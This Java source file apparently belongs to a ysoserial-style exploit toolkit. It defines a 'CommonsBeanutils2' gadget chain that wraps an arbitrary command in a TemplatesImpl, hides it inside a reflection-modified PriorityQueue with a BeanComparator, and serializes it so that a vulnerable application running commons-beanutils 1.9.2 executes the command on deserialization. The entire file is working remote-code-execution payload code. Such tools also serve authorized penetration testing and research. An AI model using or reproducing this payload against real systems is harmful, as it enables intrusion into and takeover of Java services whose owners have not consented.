package payloads;

import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import java.lang.reflect.Constructor;
import java.util.Comparator;
import java.util.PriorityQueue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.CCKUAILONG })
public class CommonsBeanutils2 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception{
		final Object templates = Gadgets.createTemplatesImpl(command);

		Constructor constructor = Reflections.getFirstCtor("java.util.Collections$ReverseComparator");
		Reflections.setAccessible(constructor);
		Object obj = constructor.newInstance();

		final BeanComparator comparator = new BeanComparator(null, (Comparator) obj);

		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(1);
		queue.add(1);

		Reflections.setFieldValue(comparator, "property", "outputProperties");
		Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

		return queue;
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(CommonsBeanutils2.class, command, fusion);
	}
}
